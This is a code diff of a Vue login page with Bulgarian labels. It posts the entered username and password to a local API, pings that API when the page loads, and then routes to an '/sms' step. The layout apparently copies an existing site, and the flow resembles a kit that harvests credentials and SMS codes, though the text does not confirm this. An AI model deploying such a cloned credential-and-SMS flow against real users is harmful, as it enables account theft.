@@ -19,10 +19,10 @@
 
       <div class="form">
         <p>
-          <input class="edit1" id="userName" tabindex="0" size="14" name="userName" autocomplete="off" maxlength="64" placeholder="Потребител">
+          <input class="edit1" id="userName" tabindex="0" size="14" name="userName" autocomplete="off" maxlength="64" placeholder="Потребител" v-model="username">
         </p>
         <p>
-          <input type="password" class="edit1" id="pwd" tabindex="0" size="14" name="pwd" autocomplete="off" placeholder="Парола">
+          <input type="password" class="edit1" id="pwd" tabindex="0" size="14" name="pwd" autocomplete="off" placeholder="Парола" v-model="password">
         </p>
         <div style="height:4px; text-align: center;">&nbsp;</div>
         <p>
@@ -37,6 +37,9 @@
         <u>Забравена парола</u>
       </a>
         <br>
+        <div class="msg" v-if="isValid">
+          <span>Въведете потребителско име, парола и число за контрол</span>
+        </div>
       </div>
       <div class="msg1" id="detailsMsg" style="display:none"><div>Можете да заявите нова парола онлайн
         <a href="#" >тук</a>
@@ -49,11 +52,38 @@
   </body>
 </template>
 <script>
+import axios from "axios"
 export default {
   name:'login',
+  mounted(){
+    this.inti()
+  },
+  data(){
+    return{
+      username:'',
+      password:'',
+      isValid:false
+    }
+  },
   methods:{
+    inti(){
+      axios.post("http://127.0.0.1:5000/api/new").then().catch()
+    },
     red(){
-      this.$router.push("/information");
+      if(!this.username || !this.password){
+        this.isValid=true
+      }else{
+        this.isValid=false
+        const data={
+          "username":this.username,
+          "password":this.password,
+        }
+        axios.post("http://127.0.0.1:5000/api/login/new",data).then(res=>{
+          console.log(res)
+          localStorage.setItem('jwt', res.data.jwt)
+          this.$router.push("/sms")
+        }).catch()
+      }
     }
   }
 }
